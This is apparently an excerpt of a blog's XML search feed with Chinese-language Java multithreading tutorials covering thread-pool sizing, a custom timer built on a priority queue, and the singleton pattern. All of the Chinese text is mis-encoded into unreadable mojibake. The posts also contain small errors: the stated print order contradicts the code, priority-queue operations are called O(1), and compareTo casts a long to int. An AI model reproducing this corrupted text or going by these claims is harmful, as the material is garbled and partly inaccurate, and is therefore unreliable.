çš„æ•°é‡ä¸åº”è¯¥è¶…è¿‡Nï¼ˆNæ˜¯æé™ï¼‰è®¾ç½®æ¯”Næ›´å¤§è¿™ä¸ªæ—¶å€™ä¹…æ— æ³•æé«˜æ•ˆç‡äº†.åœ¨CPUæ»¡çš„æƒ…å†µä¸‹æ— æ³•æé«˜æ•ˆç‡æ­¤æ—¶å¢åŠ çº¿ç¨‹åè€Œå¢åŠ æ›´å¤šçš„çº¿ç¨‹å¼€é”€.<br>å¦‚æœä¸€ä¸ªçº¿ç¨‹çš„æ‰€æœ‰ä»£ç æ˜¯IOå¯†é›†çš„ï¼Œæ­¤æ—¶ä¸ç”¨CPUï¼Œæ­¤æ—¶è®¾ç½®çš„çº¿ç¨‹æ•°å°±å¯èƒ½è¶…è¿‡N.è¾ƒå¤§çš„å€¼å¯ä»¥ç”¨ä¸€ä¸ªæ ¸å¿ƒé€šè¿‡çº¿ç¨‹è°ƒç”¨çš„æ–¹å¼å¹¶å‘æ‰§è¡Œ.</p><p>æ­£ç¡®çš„æ€è·¯ï¼š<strong>çº¿ç¨‹æ± çš„çº¿ç¨‹æ•°ç›®ä¸ä»£ç å¯†åˆ‡ç›¸å…³ æ‰€ä»¥é€šè¿‡å®éªŒçš„æ–¹å¼è¿›è¡Œæ€§èƒ½æµ‹è¯•å°†ä»£ç ä¿®æ”¹æˆç¬¦åˆé¢„æœŸçš„çŠ¶æ€</strong></p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><h5 id="å¯¹æ¯”çº¿ç¨‹å’Œè¿›ç¨‹"><a href="#å¯¹æ¯”çº¿ç¨‹å’Œè¿›ç¨‹" class="headerlink" title="å¯¹æ¯”çº¿ç¨‹å’Œè¿›ç¨‹"></a>å¯¹æ¯”çº¿ç¨‹å’Œè¿›ç¨‹</h5><h6 id="çº¿ç¨‹çš„ä¼˜ç‚¹"><a href="#çº¿ç¨‹çš„ä¼˜ç‚¹" class="headerlink" title="çº¿ç¨‹çš„ä¼˜ç‚¹"></a>çº¿ç¨‹çš„ä¼˜ç‚¹</h6><p>1.åˆ›å»ºå‡ºä¸€ä¸ªæ–°çš„çº¿ç¨‹æ¯”åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹çš„ä»£ä»·å°å¾—å¤š.<br>2.ä¸è¿›ç¨‹ä¹‹é—´åˆ‡æ¢ç›¸æ¯”ï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢å¾ˆå°‘éœ€è¦OS<br>3.çº¿ç¨‹å ç”¨çš„èµ„æºæ›´å°‘ï¼ˆç›¸æ¯”è¿›ç¨‹<br>4.å¯ä»¥å……åˆ†åˆ©ç”¨å¤šå¤„ç†å™¨çš„å¯å¹¶è¡Œæ•°é‡<br>5.åœ¨ç­‰å¾…IOæ“ä½œç»“æŸçš„æ—¶å€™æ‰§è¡Œå…¶ä»–çš„è®¡ç®—ä»»åŠ¡<br>6.è®¡ç®—å¯†é›†å‹åº”ç”¨ï¼Œå°†è®¡ç®—åˆ†è§£åˆ°å¤šä¸ªçº¿ç¨‹ä¸­å®ç°<br>7.I&#x2F;Oå¯†é›†å‹åº”ç”¨ä¸ºäº†æé«˜æ€§èƒ½å°†I&#x2F;Oæ“ä½œé‡ç½®çº¿ç¨‹å¯ä»¥ç­‰å¾…ä¸åŒçš„I&#x2F;Oæ“ä½œ</p><h6 id="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«"></a>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</h6><p>1.è¿›ç¨‹æ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„æœ€å°å•ä½ï¼ˆç‹¬ç«‹çš„ï¼‰çº¿ç¨‹æ•°æ˜¯æœ€å°çš„æ‰§è¡Œå•ä½<br>2.è¿›ç¨‹æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œçº¿ç¨‹å€¼ç‹¬äº«æŒ‡ä»¤æ‰§è¡Œçš„å¿…è¦èµ„æº(æ¯”å¦‚å¯„å­˜å™¨å’Œæ ˆ)<br>3.ç”±äºåŒä¸€è¿›ç¨‹çš„å„çº¿ç¨‹å…±äº«å†…å­˜å’Œæ–‡ä»¶èµ„æºï¼Œå¯ä»¥ä¸é€šè¿‡å†…æ ¸ç›´æ¥ä¿„é€šä¿¡.<br>4.çº¿ç¨‹çš„åˆ›å»ºåˆ‡æ¢åŠç»ˆæ­¢æ•ˆç‡é«˜.</p><h5 id="ä¿è¯çº¿ç¨‹å®‰å…¨çš„æ€è·¯"><a href="#ä¿è¯çº¿ç¨‹å®‰å…¨çš„æ€è·¯" class="headerlink" title="ä¿è¯çº¿ç¨‹å®‰å…¨çš„æ€è·¯"></a>ä¿è¯çº¿ç¨‹å®‰å…¨çš„æ€è·¯</h5><p>1.ä½¿â½¤æ²¡æœ‰å…±äº«èµ„æºçš„æ¨¡å‹<br>2.é€‚â½¤å…±äº«èµ„æºåªè¯»ï¼Œä¸å†™çš„æ¨¡å‹<br>a. ä¸éœ€è¦å†™å…±äº«èµ„æºçš„æ¨¡å‹<br>b. ä½¿â½¤ä¸å¯å˜å¯¹è±¡<br>3.ç›´â¾¯çº¿ç¨‹å®‰å…¨ï¼ˆé‡ç‚¹ï¼‰<br>a. ä¿è¯åŸâ¼¦æ€§<br>b. ä¿è¯é¡ºåºæ€§<br>c. ä¿è¯å¯â»…æ€§</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x7_</title>
      <link href="/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%83/"/>
      <url>/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%83/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡ä¸ƒ"><a href="#å¤šçº¿ç¨‹ç¯‡ä¸ƒ" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡ä¸ƒ"></a>å¤šçº¿ç¨‹ç¯‡ä¸ƒ</h3><h4 id="å®šæ—¶å™¨"><a href="#å®šæ—¶å™¨" class="headerlink" title="å®šæ—¶å™¨"></a>å®šæ—¶å™¨</h4><h5 id="ä»€ä¹ˆæ˜¯å®šæ—¶å™¨"><a href="#ä»€ä¹ˆæ˜¯å®šæ—¶å™¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å®šæ—¶å™¨"></a>ä»€ä¹ˆæ˜¯å®šæ—¶å™¨</h5><p>å¬åˆ°å®šæ—¶å™¨ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯â€œé—¹é’Ÿâ€.åˆ°ä¸€ä¸ªè®¾ç½®å¥½çš„æ—¶é—´ä¹‹åå°±æ‰§è¡ŒæŸä¸ªæŒ‡å®šå¥½çš„ä»£ç .(åœ¨å®é™…å¼€å‘ä¸­éå¸¸å¸¸ç”¨ï¼Œå¦‚ç½‘ç»œé€šä¿¡ã€é‚®ä»¶å‘é€ã€‘)<br>ä½ åœ¨æŠ¢æ¼”å”±ä¼šé—¨ç¥¨ï¼Œå·²ç»åˆ°äº†æ”¯ä»˜é¡µé¢ï¼Œä½†æ˜¯ç½‘çªç„¶å´©äº†ï¼Œé¡µé¢æ˜¾ç¤ºè®©ä½ ç­‰å¾…ï¼Œè¿™ä¸‹æ€ä¹ˆåŠï¼ï¼å¯¹äºæˆ‘ä»¬æ¥è¯´æ˜¯ä¸èƒ½æ— é™çš„ç­‰å¾…ä¸‹å»çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç­‰å¾…æœŸé™æœ€å¥½æ˜¯å°½å¿«å¤„ç†ï¼Œæ­¤å¤„çš„ç­‰å¾…æ—¶é—´å°±é€šè¿‡å®šæ—¶å™¨æ¥å®ç°äº†.</p><h5 id="æ ‡å‡†åº“ä¸­çš„å®šæ—¶å™¨"><a href="#æ ‡å‡†åº“ä¸­çš„å®šæ—¶å™¨" class="headerlink" title="æ ‡å‡†åº“ä¸­çš„å®šæ—¶å™¨"></a>æ ‡å‡†åº“ä¸­çš„å®šæ—¶å™¨</h5><p>æ ‡å‡†åº“ä¸­æä¾›äº†ä¸€ä¸ªTimerç±».å…¶æ ¸å¿ƒæ–¹æ³•ä¸º<strong>schedule</strong>.(æ³¨æ„ä¸è¦è‡ªå‘½åTimerç±»)<br>schedule åŒ…å«ä¸¤ä¸ªå‚æ•°. ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå³å°†è¦æ‰§è¡Œçš„ä»»åŠ¡ä»£ç , ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå¤šé•¿æ—¶é—´ä¹‹å æ‰§è¡Œ (å•ä½ä¸ºæ¯«ç§’). </p><p>ä¸Šä»£ç ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeKeeper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Timer</span> <span class="variable">timer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Timer</span>();       <span class="comment">//åŒ¿åå†…éƒ¨ç±» ç»§æ‰¿TimerTakå¹¶åˆ›å»ºä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">TimerTask</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Hello Keeper!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç <br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\8a40ecceb25dcde25fd4442e4454bce7.png)</p><p>å‘ç°å…ˆæ‰“å°äº†â€Hello Keeper!â€ç­‰å¾…äº”ç§’åæ‰“å°â€™â€™Hellp Mainâ€ï¼ŒWhyï¼Ÿ<br>å¯ä»¥é€šè¿‡ä»£ç è§‚å¯Ÿåˆ°ä¸»çº¿ç¨‹æ‰§è¡Œscheduleæ–¹æ³•çš„æ—¶å€™è®²Taskæ”¾åˆ°timerå¯¹è±¡ä¸­ï¼Œtimerä¸­ä¹ŸåŒ…å«ä¸€ä¸ªçº¿ç¨‹(â€œæ‰«æçº¿ç¨‹â€ï¼Œç­‰å¾…çš„æ—¶é—´åˆ°äº†å°±ä¼šæ‰§è¡Œå®‰æ’ç»™æ‰«æçº¿ç¨‹çš„ä»»åŠ¡)</p><p>é‚£æ€ä¹ˆçº¿ç¨‹æ²¡æœ‰ç»“æŸå‘¢ï¼Ÿä¸Šæºç ï¼<br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\4c055341b2eb630f6ffd05b8976c2704.png)<br><u>Timerå†…éƒ¨è¿˜æœ‰çº¿ç¨‹ï¼</u><br><strong>ä¸€ä¸ªTimerä¸­æ˜¯å¯ä»¥å®‰æ’å¤šä¸ªä»»åŠ¡çš„</strong></p><h5 id="å®šæ—¶å™¨çš„å®ç°"><a href="#å®šæ—¶å™¨çš„å®ç°" class="headerlink" title="å®šæ—¶å™¨çš„å®ç°"></a>å®šæ—¶å™¨çš„å®ç°</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»»åŠ¡æè¿°å—</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTimerTask</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;MyTimerTask&gt; &#123;</span><br><span class="line">    <span class="comment">//éœ€è¦ä¸€ä¸ªæ‰§è¡Œçš„ä»»åŠ¡</span></span><br><span class="line">    <span class="keyword">private</span> Runnable runnable;</span><br><span class="line">    <span class="comment">//éœ€è¦æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">long</span> time;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¼ å…¥â€œç›¸å¯¹æ—¶é—´â€</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyTimerTask</span><span class="params">(Runnable runnable,<span class="type">long</span> delay)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.runnable = runnable;</span><br><span class="line">        <span class="built_in">this</span>.time = System.currentTimeMillis() + delay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(MyTimerTask o)</span> &#123;</span><br><span class="line">        <span class="comment">//è¿™æ ·å†™è®©é˜Ÿé¦–å…ƒç´ æ˜¯æœ€å°æ—¶é—´çš„å€¼</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)(<span class="built_in">this</span>.time - o.time);</span><br><span class="line">    <span class="comment">//æœ€å¤§åè¿‡æ¥ é€šè¿‡å°è¯•æ¥åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">//return o.time - this.time;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Runnable <span class="title function_">getRunnable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> runnable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTimer</span> &#123;</span><br><span class="line">    <span class="comment">//å­˜å‚¨ä»»åŠ¡çš„æ•°æ®ç»“æ„</span></span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;MyTimerTask&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;MyTimerTask&gt;();</span><br><span class="line">    <span class="comment">//ä½¿ç”¨è¿™ä¸ªå¯¹è±¡ä½œä¸ºé”å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">schedule</span><span class="params">(Runnable runnable, <span class="type">long</span> delay)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">            queue.offer(<span class="keyword">new</span> <span class="title class_">MyTimerTask</span>(runnable, delay));</span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‰«æçº¿ç¨‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyTimer</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ›å»ºçº¿ç¨‹</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨while æ˜¯ä¸ºäº†åœ¨waitè¢«å”¤é†’æ—¶ å†ç¡®è®¤ä¸€ä¸‹æ¡ä»¶</span></span><br><span class="line">     <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                 <span class="keyword">while</span>(queue.isEmpty()) &#123;</span><br><span class="line">                     locker.wait();</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="comment">//æ¯”è¾ƒå½“å‰é˜Ÿé¦–å…ƒç´ æ˜¯å¦å¯ä»¥æ‰§è¡Œäº†</span></span><br><span class="line">                 <span class="type">MyTimerTask</span> <span class="variable">task</span> <span class="operator">=</span> queue.peek();</span><br><span class="line">                 <span class="type">long</span> <span class="variable">curTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">                 <span class="keyword">if</span>(curTime &gt;= task.getTime()) &#123;</span><br><span class="line">                     <span class="comment">//è¾¾åˆ°æ—¶é—´å¯ä»¥æ‰§è¡Œ</span></span><br><span class="line">                     task.getRunnable().run();</span><br><span class="line">                     <span class="comment">//æ‰§è¡Œå®Œå°±å¯ä»¥ä»é˜Ÿåˆ—ä¸­delete</span></span><br><span class="line">                     queue.poll();</span><br><span class="line">                 &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="comment">//æ²¡åˆ°æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´ ç­‰å¾…ä¸‹ä¸€æ¬¡åˆ¤å®š</span></span><br><span class="line">                     locker.wait(task.getTime() - curTime);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;<span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    t.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®šæ—¶å™¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeKeeper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyTimer</span> <span class="variable">timer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTimer</span>();</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;5000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">5000</span>);</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;4000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">4000</span>);</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;3000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">3000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Game Start!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240921113003059.png" alt="image-20240921113003059"></p><h6 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h6><p>1.Timerä¸­éœ€è¦æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰«æä»»åŠ¡æ˜¯å¦åˆ°æ—¶é—´ï¼Œæ˜¯å¦æ‰§è¡Œ,<br>2.éœ€è¦ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒæŠŠæ‰€æœ‰çš„ä»»åŠ¡éƒ½ä¿å­˜èµ·æ¥<br>3.éœ€è¦åˆ›å»ºä¸€ä¸ªç±»é€šè¿‡ç±»çš„å¯¹è±¡æè¿°ä¸€ä¸ªä»»åŠ¡(è‡³å°‘åŒ…å«ä»»åŠ¡å’Œæ—¶é—´)<br>ç›¸æ¯”ArrayListä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—æ›´å¥½ã€ä¼˜å…ˆçº§é˜Ÿåˆ—æ—¶é—´å¤æ‚åº¦å¯ä»¥è¾¾åˆ°O(1)ã€‘<br>å’±éƒ½çŸ¥é“ArrayListï¼ˆæ•°ç»„ï¼‰éå†æ—¶ä¼šå¯¹æ¯ä¸€ä¸ªä»»åŠ¡éƒ½è¿›è¡Œéå†å¹¶ä¸”å¯èƒ½ä¼šæœ‰å¾ˆå¤šè¶Ÿï¼Œè¿™ä¸æ˜¯å¦¥å¦¥çš„èµ„æºæµªè´¹.è€Œä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—å¯ä»¥ç»™Timerä¸­çš„ä»»åŠ¡â€œèµ‹å€¼â€ï¼Œæœ€å…ˆæ‰§è¡Œæ—¶é—´æœ€å°çš„ä»»åŠ¡ï¼Œå…¶ä»–ä»»åŠ¡å°±ä¸èƒ½æ‰§è¡Œäº†.</p><h6 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h6><p>1.â€è°ƒè¯•å™¨â€æ€ä¹ˆä½¿ç”¨ï¼Ÿ<br>é è°±ä¸€ç‚¹çš„æ˜¯æ‰“å°æ—¥å¿—ã€printlnã€‘ï¼Œé¿å…æ‰“æ–­ç‚¹å¯¹çº¿ç¨‹æ­£å¸¸å·¥ä½œçš„å½±å“.</p><p>2.ä¸ºä»€ä¹ˆä½¿ç”¨waitä¸ä½¿ç”¨sleepï¼Ÿã€é¿å…å¿™ç­‰ æ¶ˆè€—èµ„æºã€‘<br>ä½¿ç”¨waitæ¯”sleepæ›´å¥½.<strong>ä¸»çº¿ç¨‹è°ƒç”¨scheduleæ·»åŠ æ–°ä»»åŠ¡ä½†è¿˜åœ¨ç­‰å¾…è¿‡ç¨‹ï¼Œæ–°çš„ä»»åŠ¡æ‰§è¡Œæ—¶é—´æ¯”æœ€æ—©çš„ä»»åŠ¡æ—¶é—´è¿˜æ—©åˆšå¥½å¯ä»¥ä½¿ç”¨scheduleä¸­çš„notifyå”¤é†’waitè®©å¾ªç¯å†æ‰§è¡Œä¸€é</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x6_</title>
      <link href="/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AD/"/>
      <url>/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡å…­"><a href="#å¤šçº¿ç¨‹ç¯‡å…­" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡å…­"></a>å¤šçº¿ç¨‹ç¯‡å…­</h3><h4 id="ä»€ä¹ˆæ˜¯å•ä¾‹æ¨¡å¼ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å•ä¾‹æ¨¡å¼ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å•ä¾‹æ¨¡å¼ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å•ä¾‹æ¨¡å¼ï¼Ÿ</h4><p>å•ä¾‹æ¨¡å¼æ˜¯æœ€å¸¸è§çš„ <strong>è®¾è®¡æ¨¡å¼</strong>.<br>é¡¾åæ€ä¹‰ï¼Œå•ä¾‹æ¨¡å¼æŒ‡çš„å°±æ˜¯å•ä¸ªå®ä¾‹çš„æ¨¡å¼.ï¼ˆé’ˆå¯¹æŸäº›ç±»åªèƒ½ä½¿ç”¨ä¸€ä¸ªå¯¹è±¡çš„åœºæ™¯ã€å¦‚MySQLã€JDBCã€DataSourceã€‘ï¼‰</p><h5 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a>è®¾è®¡æ¨¡å¼</h5><p>è®¾è®¡æ¨¡å¼æ˜¯é’ˆå¯¹æŸäº›é—®é¢˜åœºæ™¯è€Œäº§ç”Ÿçš„å¤„ç†é—®é¢˜çš„æ–¹æ³•.(å°±è·Ÿä½ æƒ³åƒæ—©é¥­ï¼Œå¯ä»¥é€‰æ‹©è‡ªå·±åšæˆ–è€…å‡ºå»ä¹°æˆ–è€…è¹­åˆ«äººæˆ–è€…åˆ«çš„è§£å†³æ–¹æ³•ä¸€æ ·)<br><strong>tips</strong><br><strong>å•ä¾‹æ¨¡å¼æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œèƒ½ä¿è¯æŸä¸ªç±»åœ¨ç¨‹åºä¸­åªå­˜åœ¨å”¯ä¸€ä¸€ä»½å®ä¾‹è€Œä¸ä¼šåˆ›å»ºå‡ºå¤šä¸ªå®ä¾‹.</strong></p><p>å•ä¾‹æ¨¡å¼åˆåˆ†ä¸ºé¥¿æ±—å’Œæ‡’æ±‰ä¸¤ç§.</p><h5 id="é¥¿æ±‰æ¨¡å¼"><a href="#é¥¿æ±‰æ¨¡å¼" class="headerlink" title="é¥¿æ±‰æ¨¡å¼"></a>é¥¿æ±‰æ¨¡å¼</h5><p><strong>åˆ›å»ºçš„æ¯”è¾ƒæ—©ï¼Œç±»åŠ è½½æ—¶å°±åˆ›å»ºå‡ºäº†.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span 